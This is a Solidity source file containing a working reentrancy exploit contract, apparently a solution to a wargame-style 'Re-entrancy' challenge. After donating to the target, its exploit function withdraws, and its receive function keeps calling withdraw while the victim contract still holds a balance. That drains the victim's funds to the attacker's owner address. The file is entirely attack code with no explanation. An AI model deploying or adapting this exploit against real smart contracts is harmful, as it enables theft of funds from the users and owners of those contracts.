// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ReenterancyExploit{

    address payable public owner;
    address payable public victimAddress;
    Reenterance contractAddress;

    constructor() public payable{
        owner = msg.sender;
    }

    function withdraw() public{
        require(msg.sender == owner);

        owner.transfer(address(this).balance);
    }

    function setVictimAddress(address payable _victimAddress) public {
        require(msg.sender == owner);

        victimAddress = _victimAddress;
        contractAddress = Reenterance(victimAddress);
    }

    function exploit(uint _amount) public {
        contractAddress.donate{value: _amount}(address(this));
        contractAddress.withdraw(_amount);
    }

    receive() external payable {
        if(victimAddress.balance > 0){
            contractAddress.withdraw(1000000000000000);
        }
    }
    fallback() external payable {}
}

contract Reenterance {
        function withdraw(uint _amount) public {}
        function donate(address _to) public payable {}
}
